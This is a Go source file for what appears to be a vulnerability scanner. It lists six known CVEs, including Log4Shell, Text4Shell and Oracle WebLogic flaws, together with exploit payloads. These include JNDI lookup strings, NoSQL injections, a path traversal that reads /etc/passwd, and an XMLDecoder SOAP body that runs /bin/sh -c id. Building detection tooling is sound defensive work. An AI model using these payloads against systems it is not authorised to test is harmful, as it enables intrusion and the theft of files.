package db

import (
	"time"
)

// CVEMetadata represents information about a specific CVE
type CVEMetadata struct {
	ID          string    `json:"id"`
	Name        string    `json:"name"`
	Description string    `json:"description"`
	Severity    string    `json:"severity"`
	Type        ScannerType `json:"type"`
	Payloads    []string  `json:"payloads"`
	References  []string  `json:"references"`
}

// GetCVEDatabase returns a map of CVE IDs to their metadata
func GetCVEDatabase() map[string]CVEMetadata {
	return map[string]CVEMetadata{
		"CVE-2021-44228": {
			ID:          "CVE-2021-44228",
			Name:        "Log4Shell",
			Description: "Apache Log4j2 JNDI features do not protect against attacker controlled LDAP and other JNDI related endpoints.",
			Severity:    "Critical",
			Type:        ScannerRCE,
			Payloads: []string{
				"${jndi:ldap://127.0.0.1/a}",
				"${jndi:dns://127.0.0.1/a}",
				"${jndi:rmi://127.0.0.1/a}",
			},
			References: []string{"https://nvd.nist.gov/vuln/detail/CVE-2021-44228"},
		},
		"CVE-2021-22911": {
			ID:          "CVE-2021-22911",
			Name:        "Rocket.Chat NoSQL Injection",
			Description: "NoSQL Injection vulnerability in Rocket.Chat allows for remote code execution.",
			Severity:    "Critical",
			Type:        ScannerSQL,
			Payloads: []string{
				"{\"$ne\": null}",
				"{\"$gt\": \"\"}",
			},
			References: []string{"https://nvd.nist.gov/vuln/detail/CVE-2021-22911"},
		},
		"CVE-2019-11510": {
			ID:          "CVE-2019-11510",
			Name:        "Pulse Connect Secure LFI",
			Description: "An unauthenticated remote attacker can send a specially crafted URI to perform an arbitrary file read vulnerability.",
			Severity:    "Critical",
			Type:        ScannerLFI,
			Payloads: []string{
				"/dana-na/../dana-etc/passwd",
			},
			References: []string{"https://nvd.nist.gov/vuln/detail/CVE-2019-11510"},
		},
		"CVE-2020-14882": {
			ID:          "CVE-2020-14882",
			Name:        "Oracle WebLogic RCE",
			Description: "Vulnerability in the Oracle WebLogic Server product of Oracle Fusion Middleware. Easily exploitable vulnerability allows unauthenticated attacker with network access via HTTP to compromise Oracle WebLogic Server.",
			Severity:    "Critical",
			Type:        ScannerRCE,
			Payloads: []string{
				"/console/css/%252e%252e%252fconsole.portal",
			},
			References: []string{"https://nvd.nist.gov/vuln/detail/CVE-2020-14882"},
		},
		"CVE-2022-42889": {
			ID:          "CVE-2022-42889",
			Name:        "Text4Shell",
			Description: "Apache Commons Text performs variable interpolation, such as \"${sys:os.name}\", \"${env:USER}\" and \"${script:javascript:3 + 4}\".",
			Severity:    "Critical",
			Type:        ScannerRCE,
			Payloads: []string{
				"${script:javascript:java.lang.Runtime.getRuntime().exec('id')}",
			},
			References: []string{"https://nvd.nist.gov/vuln/detail/CVE-2022-42889"},
		},
		"CVE-2017-10271": {
			ID:          "CVE-2017-10271",
			Name:        "Oracle WebLogic XXE/RCE",
			Description: "Vulnerability in the Oracle WebLogic Server component of Oracle Fusion Middleware. Easily exploitable vulnerability allows unauthenticated attacker with network access via HTTP to compromise Oracle WebLogic Server.",
			Severity:    "Critical",
			Type:        ScannerXXE,
			Payloads: []string{
				"<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"><soapenv:Header><work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\"><java><java version=\"1.8.0\" class=\"java.beans.XMLDecoder\"><void class=\"java.lang.ProcessBuilder\"><array class=\"java.lang.String\" length=\"3\"><value>/bin/sh</value><value>-c</value><value>id</value></array><void method=\"start\"/></void></java></java></work:WorkContext></soapenv:Header><soapenv:Body/></soapenv:Envelope>",
			},
			References: []string{"https://nvd.nist.gov/vuln/detail/CVE-2017-10271"},
		},
	}
}

// GetCVEsByType returns all CVEs for a specific scanner type
func GetCVEsByType(t ScannerType) []CVEMetadata {
	db := GetCVEDatabase()
	var cves []CVEMetadata
	for _, cve := range db {
		if cve.Type == t {
			cves = append(cves, cve)
		}
	}
	return cves
}
